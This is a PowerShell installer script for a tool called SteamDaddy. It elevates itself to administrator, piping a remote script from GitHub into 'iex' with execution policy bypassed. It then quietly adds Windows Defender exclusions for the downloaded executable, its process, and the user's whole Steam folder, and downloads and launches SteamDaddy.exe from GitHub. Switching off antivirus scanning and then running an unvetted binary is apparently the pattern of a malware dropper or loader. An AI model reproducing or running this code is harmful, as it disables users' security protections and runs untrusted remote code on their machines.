# SteamDaddy One-Click Installer
$ErrorActionPreference = "Stop"

# Ensure Administrator privileges so Defender exclusion calls succeed
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[SteamDaddy] Relaunching installer with Administrator privileges to apply path exclusions..." -ForegroundColor Yellow
    if ($PSCommandPath) {
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    } else {
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/Contrary7nit/SteamDaddy/main/install.ps1 | iex`"" -Verb RunAs
    }
    exit
}

Write-Host "[SteamDaddy] Fetching latest release..." -ForegroundColor Cyan

try {
    $downloadUrl = "https://github.com/Contrary7nit/SteamDaddy/releases/latest/download/SteamDaddy.exe"

    $desktop = [Environment]::GetFolderPath("Desktop")
    $destPath = Join-Path $desktop "SteamDaddy.exe"

    Write-Host "[SteamDaddy] Pre-registering Defender path & process exclusions..." -ForegroundColor Yellow
    Add-MpPreference -ExclusionPath $destPath -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "SteamDaddy.exe" -ErrorAction SilentlyContinue

    # Find and exclude the Steam root directory
    $steamPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
    if (-not $steamPath) {
        $steamPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
    }
    if (-not $steamPath) {
        $steamPath = (Get-ItemProperty -Path "HKCU:\SOFTWARE\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
    }
    if ($steamPath) {
        Write-Host "[SteamDaddy] Excluding Steam root folder: $steamPath" -ForegroundColor Yellow
        Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue
    }

    Write-Host "[SteamDaddy] Downloading SteamDaddy.exe to Desktop..." -ForegroundColor Magenta
    Invoke-WebRequest -Uri $downloadUrl -OutFile $destPath

    Write-Host "[SteamDaddy] Launching SteamDaddy..." -ForegroundColor Green
    Start-Process $destPath
} catch {
    Write-Host "[SteamDaddy] Installation failed: $_" -ForegroundColor Red
}
